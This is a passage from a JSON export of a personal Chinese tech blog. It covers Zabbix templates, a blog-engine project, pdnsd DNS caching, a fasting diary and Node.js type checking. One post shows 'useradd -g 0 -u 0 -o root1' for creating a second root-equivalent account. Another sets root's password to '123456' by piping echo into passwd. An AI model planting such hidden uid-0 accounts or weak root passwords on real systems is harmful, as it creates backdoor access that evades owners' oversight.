id=\"sec-3\">\u8bbe\u7f6e <code>Zabbix<\/code> \u540e\u53f0<\/h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<ul class=\"org-ul\">\n<li>\u5bfc\u5165 <code>Flashcache<\/code> \u6a21\u677f\n\n<p>\nConfiguration -&gt; Templates -&gt; Import -&gt; Import file \u9009\u62e9\u4e4b\u524d\u4e0b\u8f7d\u7684 <code>zabbix-extensions\/files\/flashcache\/flashcache-template.xml<\/code>\n<\/p>\n<\/li>\n\n<li>\u5e94\u7528 <code>Flashcache<\/code> \u6a21\u677f\n\n<p>\nConfiguration -&gt; Hosts \u4e0b\u9009\u62e9\u8981\u5e94\u7528\u5230\u7684\u4e3b\u673a -&gt; Templates -&gt; Link new templates \u9009\u62e9 <code>Flashcache-Template<\/code><\/p>\n<\/li>\n<\/ul>\n<\/div>\n<\/div>\n"
},
{
  "title": "linux\u4e0b\u521b\u5efa\u53e6\u4e00\u4e2aroot\u5e10\u53f7",
  "timestamp": "2015-06-04 20:27:00",
  "tags": [
    "linux"
  ],
  "body": "<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">useradd -g 0 -u 0 -o root1\n<\/pre>\n<\/div>\n\n<p>\n\u4e0a\u9762\u7684\u547d\u4ee4\u521b\u5efa\u4e86\u4e00\u4e2a\u548c <code>root<\/code> \u5e10\u53f7\u51e0\u4e4e\u4e00\u6a21\u4e00\u6837\u7684\u5e10\u53f7 <code>root1<\/code> \uff0c\u8fd9\u4e2a\u5e10\u53f7\u767b\u5f55\u540e\u751a\u81f3\u8fde <code>$USER<\/code> \u73af\u5883\u53d8\u91cf\u90fd\u662f <code>root=\uff0c \u5e94\u8be5\u662f\u7531\u4e8e =uid<\/code> \u548c <code>root<\/code> \u5e10\u53f7\u4e00\u6837\u90fd\u662f <code>0<\/code> \uff0c\u6240\u4ee5\u4f7f\u7528\u4e86 <code>root<\/code> \u5e10\u53f7\u7684\u7528\u6237\u540d\uff0c\u4f46\u662f\u53ef\u4ee5\u6307\u5b9a\u4e0d\u540c\u7684 <code>HOME<\/code> \u4ee5\u53ca\u5bc6\u7801\u7b49\u3002<\/p>\n"
},
{
  "title": "\u4eca\u5929\u5f00\u59cbediary\u9879\u76ee",
  "timestamp": "2015-05-30 15:26:00",
  "tags": [
    "ediary"
  ],
  "body": "<p>\n\u53c8\u6298\u817e\u4e86\u4e00\u4e0a\u5348\u7684 <a href=\"https:\/\/github.com\/renard\/o-blog\">o-blog<\/a> \uff0c\u603b\u662f\u5c11\u4e86\u51e0\u4e2a <code>js<\/code> \u6587\u4ef6\uff0c\u6700\u8fd1\u5347\u7ea7\u4e86 <code>emacs<\/code> \u4e2d\u7684\u6240\u6709\u5305\u540e <a href=\"http:\/\/blog.kankanan.com\">\u6211\u7684\u535a\u5ba2<\/a> \u603b\u7b97\u662f\u6b47\u83dc\u4e86\uff0c\u4f7f\u7528 <a href=\"https:\/\/github.com\/renard\/o-blog\">o-blog<\/a> \u5199\u4e86\u4e24\u5e74\u535a\u5ba2\uff0c\u8fc7\u7a0b\u8fd8\u662f\u5f88\u6109\u5feb\u7684\uff0c\u9664\u4e86\u5347\u7ea7\u7cfb\u7edf\u540e\u5076\u5c14\u4f1a\u6709\u517c\u5bb9\u6027\u95ee\u9898\uff0c\u9700\u8981\u8017\u8d39\u65f6\u95f4\u4fee\u590d\u5916\uff0c\u5199\u8d77\u535a\u5ba2\u6765\u5f88\u65b9\u4fbf\uff0c\u6709\u65f6\u5019\u5de5\u4f5c\u76f8\u5173\u7684\u8c03\u7814\u9879\u76ee\u4e5f\u5fcd\u4e0d\u4f4f\u53d1\u5e03\u5230\u535a\u5ba2\u4e0a\uff0c\u7136\u540e\u628a\u94fe\u63a5\u53d1\u51fa\u53bb\u3002\u4e0d\u8fc7\u8003\u8651\u5230\u6211\u4f7f\u7528\u7684\u7cfb\u7edf\uff08Archlinux\uff09\u66f4\u65b0\u5f97\u592a\u52e4\u5feb\u4e86\uff0c\u4f7f\u7528\u7684\u535a\u5ba2\u7cfb\u7edf\u4e00\u5b9a\u8981\u591f\u7b80\u5355\u76f4\u89c2\uff0c\u6211\u53ef\u4ee5\u6539\u5f97\u52a8\u3002\n<\/p>\n\n<p>\n\u6211\u60f3\u662f\u65f6\u5019\u6309\u81ea\u5df2\u7684\u60f3\u6cd5\u5199\u4e00\u4e2a\u7c7b\u4f3c\u7684\u9879\u76ee\u4e86\uff0c\u8fd9\u4e2a\u9879\u76ee\u7684\u6838\u5fc3\u529f\u80fd\u4e00\u5b9a\u8981\u7cbe\u7b80\uff0c\u4e13\u6ce8\u4e8e\u65e5\u8bb0\u529f\u80fd\uff0c\u6700\u597d\u80fd\u628a\u5c55\u793a\u5c42\u5265\u79bb\u51fa\u53bb\uff0c <code>jquery<\/code> \u548c <code>bootstrap<\/code> \u5b9e\u5728\u662f\u592a\u91cd\u4e86\uff0c\u5c55\u793a\u65e5\u5fd7\u7528\u5f97\u7740\u8fd9\u4e48\u91cd\u7684\u4e1c\u897f\u5417\uff1f\n<\/p>\n\n<p>\n\u6838\u5fc3\u5e94\u8be5\u662f\u6570\u636e\u7ed3\u6784\uff0c\u65e5\u5fd7\u7684\u4fe1\u606f\u5305\u542b\uff1a\u6807\u9898\uff08title\uff09\u3001\u6807\u7b7e\uff08tags\uff09\u3001\u53d1\u5e03\u65e5\u671f\uff08timestamp\uff09\u3001\u6b63\u6587\uff08source\uff09\u52a0\u4e0a\u53ef\u9009\u7684\u77ed\u540d\u79f0\uff08slug\uff09\u7528\u4e8e\u751f\u6210\u94fe\u63a5\u3002\u800c\u6700\u57fa\u7840\u7684\u529f\u80fd\u5c31\u662f\u4ece\u65e5\u5fd7\u6587\u672c\u4e2d\u63d0\u53d6\u8fd9\u4e9b\u4fe1\u606f\u3002\u63a5\u4e0b\u6765\u6839\u636e\u8fd9\u4e9b\u4fe1\u606f\u6765\u751f\u6210\u5f85\u53d1\u5e03\u7684\u65e5\u5fd7\u6587\u4ef6\uff0c\u4ee5\u53ca\u4e0e\u73b0\u6709\u7684\u53d1\u5e03\u7cfb\u7edf\uff08\u5982\uff1awordpress\u3001git pages\uff09\u7684\u5bf9\u63a5\u5c31\u53ef\u4ee5\u72ec\u7acb\u8fdb\u884c\u5f00\u53d1\u4e86\uff0c\u800c\u4e14\u5e94\u8be5\u53ef\u4ee5\u4e92\u76f8\u66ff\u6362\u3002\n<\/p>\n\n<p>\n\u63a5\u4e0b\u6765\u8981\u5b8c\u6210\u7684\u7b2c\u4e00\u4e2a\u4efb\u52a1\u5c31\u662f\u89e3\u6790\u672c\u65e5\u5fd7\u6587\u4ef6\u3002<\/p>\n"
},
{
  "title": "\u7b2c\u4e00\u4e2a\u4efb\u52a1\u89e3\u6790\u65e5\u5fd7\u6587\u4ef6\u987a\u5229\u5b8c\u6210",
  "timestamp": "2015-05-30 16:58:00",
  "tags": [
    "ediary"
  ],
  "body": "<p>\n\u53c2\u8003 <a href=\"https:\/\/github.com\/renard\/o-blog\">o-blog<\/a> \u7684\u4ee3\u7801\u987a\u5229\u5b8c\u6210\u4efb\u52a1\uff0c\u4ee3\u7801\u91cf\u5f88\u5c11\u4e0d\u523040\u884c\u3002\u8c8c\u4f3c o-blog \u5f88\u591a\u89e3\u6790org-mode\u7684\u4ee3\u7801\u90fd\u662f\u624b\u5199\u7684\uff0corg-mode \u652f\u6301\u4e00\u4e9b\u4fbf\u6377\u7684API\uff0c\u53ef\u4ee5\u51cf\u5c11\u5f88\u591a\u4ee3\u7801\u91cf\u3002\n<\/p>\n\n<p>\n\u63a5\u4e0b\u6765\u8981\u5b8c\u7684\u4efb\u52a1\u662forg-mode\u683c\u5f0f\u7684\u65e5\u8bb0\u5185\u5bb9html\u5316\u3002<\/p>\n"
},
{
  "title": "\u7b2c\u4e8c\u4e2a\u4efb\u52a1\u4ee5\u53ca\u79fb\u690d o-blog \u4e3b\u8981\u529f\u80fd\u987a\u5229\u5b8c\u6210",
  "timestamp": "2015-06-03 14:45:00",
  "tags": [
    "ediary"
  ],
  "body": "<p>\no-blog \u7684\u76f8\u5173\u7279\u6027\u8fdb\u884c\u4e86\u4e00\u756a\u53d6\u820d\uff1a\u53bb\u6389\u4e86\u4e91\u6807\u7b7e\u72ec\u7acb\u9875\u9762\uff0c\u53bb\u6389\u4e86\u5e74\/\u6708\u53d1\u5e03\u5217\u8868\u9875\uff0c\u53bb\u6389\u4e86\u6700\u65b0\u6587\u7ae0\u4fa7\u8fb9\u680f\uff0c\u53bb\u6389\u4e86\u6587\u7ae0\u9875\u9762\u7684\u4e0a\u4e00\u6587\u7ae0\u3001\u4e0b\u4e00\u6587\u7ae0\u94fe\u63a5\uff0c\u4ee5\u53ca\u9009\u62e9\u76f4\u63a5\u5728\u6807\u7b7e\u4fa7\u8fb9\u680f\u9ad8\u4eae\u76f8\u5173\u6807\u7b7e\uff0c\u65b0\u589e\u6309\u6807\u7b7e\u8ba2\u9605\uff0c\u65b0\u589e\u4e3b\u9875\u3002\n<\/p>\n\n<p>\n\u63a5\u4e0b\u6765\u8fd8\u6709\u9996\u9875\u7684\u9875\u9762\u9700\u8981\u6309\u65f6\u95f4\u987a\u5e8f\u6392\u5217\uff0c\u53e6\u5916\u6700\u597d1\u53f7\u9875\u7801\u8868\u793a\u6700\u65e7\u7684\u6587\u7ae0\uff0c\u8fd9\u6837\u53d1\u8868\u65b0\u6587\u7ae0\u540e\u6587\u7ae0\u6240\u5728\u7684\u9875\u7801\u4e0d\u4f1a\u53d8\u6765\u53d8\u53bb\u4e0d\u5229\u4e8e\u6536\u85cf\u3002<\/p>\n"
},
{
  "title": "ediary\u5df2\u57fa\u672c\u53ef\u7528\u6b63\u5f0f\u5728\u4e2a\u4eba\u535a\u5ba2\u4e2d\u542f\u7528",
  "timestamp": "2015-06-08 11:39:00",
  "tags": [
    "ediary"
  ],
  "body": "<p>\n\u7ecf\u8fc7\u4e0a\u5468\u672b\u7684\u4e00\u7ffb\u52aa\u529b\uff0c\u53c2\u8003 <a href=\"http:\/\/medium.com\/\">medium<\/a> \u7684\u98ce\u683c\uff0c\u5bf9\u5e03\u5c40\u8fdb\u884c\u5f7b\u5e95\u7684\u8c03\u6574\uff1a\n<\/p>\n\n<ul class=\"org-ul\">\n<li>\u4f7f\u7528\u4e09\u5c42\u7ec4\u7ec7\u65b9\u5f0f\uff1acategory &gt; tag &gt; article\n<\/li>\n\n<li>article \u53bb\u9664\u5e72\u6270\u9605\u8bfb\u7684\u5143\u7d20\uff1a\u6807\u7b7e\u4e91\uff0c\u7f51\u5740\u4e2d\u53bb\u9664\u4e86\u65f6\u95f4\u4fe1\u606f\n<\/li>\n\n<li>category \u653e\u5230\u4e00\u7ea7\u83dc\u5355\u4e2d\uff0c\u652f\u6301\u6309 category \u8ba2\u9605\n<\/li>\n\n<li>\u79fb\u690d o-blog \u4e2d\u7684sitemap\u529f\u80fd\n<\/li>\n<\/ul>\n\n<p>\n\u63a5\u4e0b\u6765\u7684\u4efb\u52a1\u662f\u5bf9\u4e3b\u9875\u8fdb\u884c\u6b63\u5f0f\u652f\u6301\uff0c\u76ee\u524d\u662f\u624b\u5de5\u62f7\u8d1d\u4e86 category \u7684\u7b2c\u4e00\u9875\u505a\u4e3a\u9996\u9875\uff0c\u540e\u9762\u9700\u8981\u6539\u4e3a\u76f4\u63a5\u628a category \u7684\u7b2c\u4e00\u9875\u53d1\u5e03\u4e3a\u9996\u9875\uff0c\u4ee5\u53ca\u663e\u793a\u65b9\u9762\u7684BUG\u4fee\u590d\u3002<\/p>\n"
},
{
  "title": "ediary\u652f\u6301\u4e3b\u9875\u4ee5\u53ca\u5b8c\u6210\u56fd\u9645\u5316\uff08i18n\uff09\u652f\u6301",
  "timestamp": "2015-06-09 15:04:00",
  "tags": [
    "ediary"
  ],
  "body": "<ul class=\"org-ul\">\n<li>\u5b8c\u6210\u4e3b\u9875\u652f\u6301\n\n<p>\n\u901a\u8fc7\u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\u6dfb\u52a0\u4e3b\u9875\u9009\u9879 <code>config.site.home<\/code> \uff0c\u652f\u6301\u628a\u67d0\u4e00\u4e2a\u9875\u9762\u901a\u8fc7\u62f7\u8d1d\u505a\u4e3a\u4e3b\u9875 <code>\/index.html<\/code> \u3002\n<\/p>\n<\/li>\n\n<li>\u5b8c\u6210\u56fd\u9645\u5316\u652f\u6301\n\n<p>\n\u6309\u7167\u6587\u7ae0 <a href=\"https:\/\/research.linagora.com\/blog\/?p=37\">A strategy for i18n in node.js server templates<\/a> \u7684\u5efa\u8bae\uff0c\u9009\u7528 <a href=\"https:\/\/github.com\/mashpie\/i18n-node\">i18n-node<\/a> \u505a\u4e3a\u56fd\u9645\u5316\u65b9\u6848\uff0c\u987a\u5229\u5b8c\u6210\u82f1\u6587\u53ca\u4e2d\u6587\u7b80\u4f53\u7684\u652f\u6301\u3002\n<\/p>\n<\/li>\n<\/ul>\n\n<p>\n\u63a5\u4e0b\u6765\u8981\u7b80\u5316\u5b89\u88c5\u914d\u7f6e\uff0c\u5e76\u63d0\u4f9b\u76f8\u5173\u6587\u6863\u3002<\/p>\n"
},
{
  "title": "linux\u975e\u4ea4\u4e92\u65b9\u5f0f\u4fee\u6539\u7528\u6237\u5bc6\u7801",
  "timestamp": "2015-06-16 17:35:00",
  "tags": [
    "linux"
  ],
  "body": "<p>\nlinux\u4e0b\u7684 <code>passwd<\/code> \u547d\u4ee4\u662f\u4ea4\u4e92\u5f0f\u8fd0\u884c\u7684\uff08\u5bc6\u7801\u9700\u8981\u7531\u7528\u6237\u4f7f\u7528\u952e\u76d8\u8f93\u5165\uff09\uff0c\u540e\u53f0\u7a0b\u5e8f\u5982\u679c\u8981\u6539\u7528\u6237\u5bc6\u7801\u9700\u8981\u4e00\u5b9a\u7684\u6280\u5de7\u3002\n<\/p>\n\n<p>\n\u5982\uff1a\u4ee5\u4e0b\u547d\u4ee4\u53ef\u4ee5\u5c06 <code>root<\/code> \u5e10\u53f7\u7684\u5bc6\u7801\u6539\u4e3a <code>123456<\/code>\n<\/p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">(<span style=\"color: #cc99cc;\">echo<\/span> <span style=\"color: #66cccc;\">'123456'<\/span>; sleep 1; <span style=\"color: #cc99cc;\">echo<\/span> <span style=\"color: #66cccc;\">'123456'<\/span>) | passwd <span style=\"color: #66cccc;\">'root'<\/span> &gt; \/dev\/null\n<\/pre>\n<\/div>\n\n<p>\n\u4f46\u662f\uff0c\u6b64\u65f6\u4e5f\u4e0d\u597d\u5224\u65ad\u5bc6\u7801\u662f\u5426\u6539\u6210\u529f\u4e86\uff0c\u9700\u8981\u9a8c\u8bc1\u4e00\u4e0b\u3002\n<\/p>\n\n<p>\n\u53c2\u8003\u6587\u7ae0\u300a<a href=\"http:\/\/www.xinotes.net\/notes\/note\/1833\/\">Check Linux user password in C<\/a> \u300b\u7f16\u5199\u4e86\u4ee5\u4e0b\u7a0b\u5e8f\u7528\u4e8e\u975e\u4ea4\u4e92\u5f0f\u4fee\u6539\u5bc6\u7801\uff1a\n<\/p>\n\n<p>\n<a href=\"..\/static\/change_password.c\">change_password.c<\/a>\n<\/p>\n\n<p>\n\u7f16\u8bd1\uff1a\n<\/p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">gcc -g change_password.c -o change_password -lcrypt\n<\/pre>\n<\/div>\n\n<p>\n\u8fd0\u884c\uff1a\n<\/p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">.\/change_password root 123456\n<\/pre>\n<\/div>\n"
},
{
  "title": "\u8f7b\u65ad\u98df\u65e5\uff082015-6-16\uff09",
  "timestamp": "2015-06-16 18:52:00",
  "tags": [
    "\u8f7b\u65ad\u98df"
  ],
  "body": "<p>\n\u4eca\u5929\u662f\u7b2c\u4e00\u6b21\u8fdb\u884c\u8f7b\u65ad\u98df\uff0c\u6628\u5929\u665a\u4e0a10\u70b9\u591a\u5403\u8fc7\u6c34\u679c\u540e\u5230\u73b0\u5728\u8fd8\u6ca1\u6709\u5403\u8fc7\u4e1c\u897f\uff0c\u559d\u4e86\u4e00\u5929\u7684\u8336\uff0c\u9664\u4e86\u5076\u5c14\u89c9\u5f97\u997f\u5f97\u53d1\u614c\uff0c\u4e00\u5207\u5b89\u597d\uff0c\u5de5\u4f5c\u6ca1\u6709\u75b2\u52b3\u611f\u6548\u7387\u5f88\u9ad8\uff0c\u9a6c\u4e0a\u8981\u5403\u665a\u996d\u4e86\uff0c\u5e0c\u671b\u4e0d\u8981\u5403\u5f97\u592a\u591a\uff0c\u6309\u8981\u6c42\u4e00\u5929\u53ea\u80fd\u5403600\u5361\u7684\uff0c\u7b49\u4e0b\u53ef\u522b\u5403\u8d85\u4e86\u54e6\u3002\n<\/p>\n\n<p>\n\u73b0\u5728\u809a\u5b50\u6709\u997f\u7684\u611f\u89c9\uff0c\u4f46\u662f\u53c8\u611f\u89c9\u809a\u5b50\u6709\u70b9\u6da8\uff0c\u641e\u4e0d\u6e05\u695a\u81ea\u5df2\u5230\u5e95\u662f\u4e0d\u662f\u771f\u997f\u4e86\u3002\n<\/p>\n\n<p>\n\u73b0\u5728\u521a\u597d70\u516c\u65a4\uff0c\u5e0c\u671b\u6162\u6162\u7626\u4e0b\u6765\u5427\uff0c\u8fc7\u4e86\u4eca\u5929\u660e\u5929\u5c31\u89e3\u653e\u4e86\u3002<\/p>\n"
},
{
  "title": "\u4f7f\u7528Pdnsd\u7f13\u5b58\u57df\u540d\u89e3\u6790\u7ed3\u679c\u52a0\u5feb\u4e0a\u7f51\u901f\u5ea6",
  "timestamp": "2015-06-23 18:56:00",
  "tags": [
    "web",
    "dns"
  ],
  "body": "<ul class=\"org-ul\">\n<li>\u9891\u7e41\u7684\u57df\u540d\u89e3\u6790\u5bb9\u6613\u5bfc\u81f4\u8d85\u65f6\u51fa\u9519\n\n<p>\n\u5728\u6267\u884c <code>opkg-cl update<\/code> \u6216 <code>yaourt -Syua<\/code> \u547d\u4ee4\u66f4\u65b0\u7cfb\u7edf\u8f6f\u4ef6\u4fe1\u606f\u65f6\uff0c\u5bb9\u6613\u56e0\u4e3a\u9891\u7e41\u7684\u57df\u540d\u89e3\u6790\u800c\u5bfc\u81f4\u66f4\u65b0\u901f\u5ea6\u5947\u6162\u751a\u81f3\u662f\u8d85\u65f6\u51fa\u9519\uff0c\u901a\u8fc7\u5c06\u8981\u8bbf\u95ee\u7684\u57df\u540d\u6dfb\u52a0\u5230 <code>\/etc\/hosts<\/code> \u4e2d\uff0c\u53ef\u4ee5\u7acb\u5373\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u3002\u8003\u8651\u5230\u670d\u52a1\u5668IP\u53ef\u80fd\u4f1a\u6362\uff0c\u4f7f\u7528 <code>\/etc\/hosts<\/code> \u975e\u957f\u4e45\u4e4b\u8ba1\u3002\n<\/p>\n<\/li>\n\n<li>\u7f13\u5b58\u57df\u540d\u89e3\u6790\u7ed3\u679c\n\n<p>\n\u66f4\u597d\u7684\u529e\u6cd5\u662f\u7f13\u5b58\u57df\u540d\u89e3\u6790\u7ed3\u679c\uff0c\u4e00\u822c\u6765\u8bf4\u540e\u53f0\u670d\u52a1\u7a0b\u5e8f\u53ef\u4ee5\u901a\u8fc7\u7f13\u5b58\u57df\u540d\u89e3\u6790\u7ed3\u679c\u52a0\u5feb\u540e\u7ee7\u8bf7\u6c42\u7684\u5904\u7406\uff0c\u4f46\u662f\u5bf9\u4e8e\u50cf <code>opkg-cl<\/code> \u3001 <code>yaourt<\/code> \u4e4b\u7c7b\u7684\u5de5\u5177\u7a0b\u5e8f\uff0c\u7531\u4e8e\u8fd0\u884c\u4e00\u6b21\u5c31\u9000\u51fa\u4e86\uff0c\u8981\u5b9e\u73b0\u7f13\u5b58\u57df\u540d\u89e3\u6790\u7ed3\u679c\u5c31\u663e\u5f97\u6709\u70b9\u5c0f\u9898\u5927\u4f5c\u4e86\uff0c\u6700\u597d\u662f\u5728\u7cfb\u7edf\u5e95\u5c42\u6765\u5b9e\u73b0\uff0c\u800c\u4e0d\u662f\u6bcf\u4e2a\u5e94\u7528\u7a0b\u5e8f\u90fd\u5b9e\u73b0\u8fd9\u4e2a\u529f\u80fd\u3002\n<\/p>\n\n<p>\n<a href=\"http:\/\/members.home.nl\/p.a.rombouts\/pdnsd\/\">Pdnsd<\/a> \u5c31\u662f\u8fd9\u6837\u4e00\u6b3e\u5f00\u6e90DNS\u4ee3\u7406\u670d\u52a1\u7a0b\u5e8f\uff0c\u5b83\u5b89\u88c5\u5728\u5ba2\u6237\u673a\u4e0a\uff0c\u5bf9\u4e8e\u5ba2\u6237\u7aef\u5e94\u7528\u7a0b\u5e8f\u6765\u8bf4\uff0c\u5b83\u662fDNS\u670d\u52a1\u7a0b\u5e8f\uff0c\u5bf9\u4e8e\u771f\u6b63\u7684DNS\u670d\u52a1\u6765\u8bf4\u5b83\u662fDNS\u5ba2\u6237\u7aef\u7a0b\u5e8f\u3002\n<\/p>\n<\/li>\n\n<li><a href=\"http:\/\/members.home.nl\/p.a.rombouts\/pdnsd\/\">Pdnsd<\/a> \u5b89\u88c5\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">yaourt -S pdnsd\n<\/pre>\n<\/div>\n<\/li>\n\n<li><a href=\"http:\/\/members.home.nl\/p.a.rombouts\/pdnsd\/\">Pdnsd<\/a> \u8fd0\u884c\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo systemctl enable pdnsd\nsudo systemctl start pdnsd\n<\/pre>\n<\/div>\n<\/li>\n\n<li>\u5ba2\u6237\u673aDNS\u8bbe\u7f6e\n\n<p>\n\u4fee\u6539 <code>\/etc\/resolv.conf<\/code> \u4e3a\u5982\u4e0b\u5185\u5bb9\uff1a\n<\/p>\n\n<pre class=\"example\">\nnameserver 127.0.0.1\n<\/pre>\n\n<p>\n\u5bf9\u4e8e Archlinux <code>\/etc\/resolv.conf<\/code> \u662f\u7531 <code>resolvconf<\/code> \u5de5\u5177\u751f\u6210\uff0c\u76f4\u63a5\u4fee\u6539\u540e\u968f\u65f6\u53ef\u80fd\u88ab\u8986\u76d6\uff0c\u53ef\u4ee5\u4fee\u6539 <code>\/etc\/resolvconf.conf<\/code> \u5c06\u4ee5\u4e0b\u914d\u7f6e\u884c\u53d6\u6d88\u6ce8\u91ca\uff1a\n<\/p>\n<pre class=\"example\">\n# name_servers=127.0.0.1\n<\/pre>\n\n<p>\n\u7136\u540e\u91cd\u65b0\u751f\u6210 <code>\/etc\/resolv.conf<\/code> \u914d\u7f6e\u6587\u4ef6\uff1a\n<\/p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo resolvconf -u\n<\/pre>\n<\/div>\n<\/li>\n\n<li>\u770b\u770b\u6548\u679c\n\n<p>\n\u591a\u6b21\u6267\u884c\u4e0b\u9762\u7684\u547d\u4ee4\uff0c\u53ef\u4ee5\u611f\u89c9\u5230\u540e\u51e0\u6b21\u660e\u663e\u6bd4\u7b2c\u4e00\u6b21\u5feb\uff0c\u8fd9\u5c31\u662fDNS\u7f13\u5b58\u5728\u8d77\u4f5c\u7528\u3002\n<\/p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">nslookup www.google.com\n<\/pre>\n<\/div>\n<\/li>\n\n<li>\u9002\u5408\u56fd\u5185\u73af\u5883\u7684\u914d\u7f6e\uff08\u4ec5\u4f9b\u53c2\u8003\uff09\n\n<p>\n\u5c06 <code>\/etc\/pdnsd.conf<\/code> \u914d\u7f6e\u6587\u4ef6\u4fee\u6539\u4e3a\u4ee5\u4e0b\u5185\u5bb9\uff1a\n<\/p>\n\n<pre class=\"example\">\nglobal {\n    perm_cache=1024;\n    cache_dir=\"\/var\/cache\/pdnsd\";\n    pid_file = \/var\/run\/pdnsd.pid;\n    run_as=\"pdnsd\";\n    server_ip = 127.0.0.1;\n    status_ctl = on;\n    query_method=udp_tcp;\n    min_ttl=15m;\n    max_ttl=1d;\n    timeout=10;\n    neg_domain_pol=on;\n    udpbufsize=1024;\n}\n\nserver {\n    label = \"root-servers\";\n    root_server = discover;\n    randomize_servers = on;\n    ip = 114.114.114.114,\n         223.5.5.5,\n         114.114.115.115,\n         223.6.6.6;\n    timeout = 5;\n    uptest = query;\n    interval = 30m;\n    ping_timeout = 50;\n    purge_cache = off;\n    exclude = .localdomain;\n    policy = included;\n    preset = off;\n}\n\nsource {\n    owner=localhost;\n    serve_aliases=on;\n    file=\"\/etc\/hosts\";\n}\n\nrr {\n    name=localhost;\n    reverse=on;\n    a=127.0.0.1;\n    owner=localhost;\n    soa=localhost,root.localhost,42,86400,900,86400,86400;\n}\n<\/pre>\n\n<p>\n\u91cd\u542f <a href=\"http:\/\/members.home.nl\/p.a.rombouts\/pdnsd\/\">Pdnsd<\/a> \u751f\u6548\u914d\u7f6e\uff1a\n<\/p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo systemctl restart pdnsd\n<\/pre>\n<\/div>\n<\/li>\n\n<li>\u914d\u7f6epdnsd\u4f7f\u7528dhcp\u5206\u914d\u7684dns\u670d\u52a1\u5668\n\n<p>\n\u5f80\u5f80dhcp\u63d0\u4f9b\u7684dns\u670d\u52a1\u5668\u662f\u6700\u5feb\u7684\uff08\u5b83\u53ef\u80fd\u4e5f\u505a\u4e86\u7f13\u5b58\uff09\uff0c\u7528\u5230\u4e86\u672c\u5730\u57df\u540d\u7684\u60c5\u51b5\u4e0b\u5fc5\u987b\u4f7f\u7528dhcp\u63d0\u4f9b\u7684dns\u670d\u52a1\u5668\uff0c\n\u5982\u679c\u5c06dns\u670d\u52a1\u5668\u5199\u6b7b\u5728pdnsd.conf\uff0c\u5207\u6362\u7f51\u7edc\uff08\u5982\u4ece\u516c\u53f8\u56de\u5230\u5bb6\u91cc\uff09\u5c31\u4e0a\u4e0d\u4e86\u7f51\u4e86\uff0c\u5176\u5b9e <code>resolvconf<\/code> \u5bf9 <code>pdnsd<\/code> \u63d0\u4f9b\u4e86\u652f\u6301\u3002\n<\/p>\n\n<p>\n\u53c2\u8003 <code>man resolvconf<\/code> \u5c06 <code>\/etc\/resolvconf.conf<\/code> \u6539\u4e3a\n<\/p>\n<pre class=\"example\">\nname_servers=127.0.0.1\npdnsd_conf=\/etc\/pdnsd.conf\n<\/pre>\n\n<p>\n\u5220\u6389 <code>\/etc\/pdnsd.conf<\/code> \u4e2d\u7684\u6240\u6709 <code>server<\/code> \u914d\u7f6e\u5757\u3002\n<\/p>\n\n<p>\n\u91cd\u542f <code>NetworkManager<\/code> \u751f\u6548\u914d\u7f6e\n<\/p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo systemctl restart NetworkManager\n<\/pre>\n<\/div>\n\n<p>\n\u73b0\u5728 <code>\/etc\/pdnsd.conf<\/code> \u4e2d\u7684 <code>server<\/code> \u914d\u7f6e\u5757\u5c06\u7531 <code>resolvconf<\/code> \u6765\u63d0\u4f9b\u3002\n<\/p>\n<\/li>\n\n<li>\u53c2\u8003\n\n<p>\n\u300a<a href=\"http:\/\/venmos-com.qiniudn.com\/blog\/2013\/06\/19\/pdnsd\/\">\u7528Pdnsd\u5feb\u901f\u6253\u9020\u65e0\u6c61\u67d3\u9ad8\u901f\u7f13\u5b58DNS\u670d\u52a1\u5668<\/a>\u300b<\/p>\n<\/li>\n<\/ul>\n"
},
{
  "title": "\u4f7f\u7528node.js\u7684\u5bf9\u8c61\u6a21\u5f0f\u9a8c\u8bc1\u6a21\u5757joi\u5f15\u5165\u5f3a\u7c7b\u578b",
  "timestamp": "2015-07-13 18:44:00",
  "tags": [
    "node"
  ],
  "body": "<ul class=\"org-ul\">\n<li>\u5f31\u7c7b\u578b\u7684Javascript\n\n<p>\nJavascript\u662f\u4e00\u95e8\u5f31\u7c7b\u578b\u7684\u8bed\u8a00\uff0c\u5b9a\u4e49\u53d8\u91cf\u4e0d\u9700\u8981\u6307\u5b9a\u7c7b\u578b\uff0c\u53ef\u4ee5\u4e3a\u540c\u4e00\u4e2a\u53d8\u91cf\u8d4b\u4efb\u610f\u7c7b\u578b\u7684\u503c\u3002\u8bef\u7528\u7c7b\u578b\u4e0d\u4f1a\u62a5\u9519\uff0c\u800c\u7ed3\u679c\u4f1a\u8ba9\u4f60\u5927\u5403\u4e00\u60ca\uff1a\n<\/p>\n\n<pre class=\"example\">\n&gt; \"1\" + 1\n'11'\n&gt; if (\"false\") { console.log(\"yes\") } else { console.log(\"no\"); }\nyes\nundefined\n&gt;\n<\/pre>\n\n<p>\nredis\u4e2d\u5f88\u591a\u6570\u636e\u7ed3\u6784\u53d6\u51fa\u65f6\u90fd\u662f\u5b57\u7b26\u4e32\u503c\uff08\u5982\uff1aset\u3001hash\uff09\uff0c\u8c03\u7528\u65b9\u9700\u8981\u81ea\u884c\u5c06\u5b83\u8f6c\u6362\u6210\u6b63\u786e\u7684\u7c7b\u578b\uff08\u5982\uff1aBoolean\u3001Date\u3001Number\uff09\uff0c\u5982\u679c\u4e0d\u8f6c\u6362\u6210\u6b63\u786e\u7684\u7c7b\u578b\u4f1a\u5bfc\u81f4\u5197\u957f\u7684\u4ee3\u7801\uff0c\u5982Boolean\u7c7b\u578b\uff1a\n<\/p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\"><span style=\"color: #99cc99;\">if<\/span> ((String(model.stoped) == <span style=\"color: #66cccc;\">'true'<\/span>)) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #999999; font-style: italic;\">\/\/ <\/span><span style=\"color: #999999; font-style: italic;\">Do something when 